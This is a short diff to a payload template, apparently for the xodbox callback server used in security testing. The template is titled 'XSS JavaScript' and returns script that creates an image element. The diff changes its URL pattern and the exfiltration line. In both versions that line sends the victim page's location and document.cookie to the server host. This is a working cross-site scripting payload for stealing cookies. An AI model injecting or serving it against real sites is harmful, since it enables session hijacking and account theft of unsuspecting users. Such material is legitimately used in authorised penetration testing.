@@ -2,7 +2,7 @@
 title: XSS JavaScript
 description: Returns JS that embeds an image back to xodbox
 weight: -500
-pattern: /jsc$
+pattern: /xss-js$
 is_final: true
 data:
   headers:
@@ -24,7 +24,7 @@ exfil.
 (function (){
     var s = document.createElement("img");
     document.body.appendChild(s);
-    s.src="//{{.Request.Host}}/jscb?src="+window.location+"&c="+document.cookie;
+    s.src="//{{.Request.Host}}/{{ .NotifyString}}/jscb?src="+window.location+"&c="+document.cookie;
 })()
 
 ```
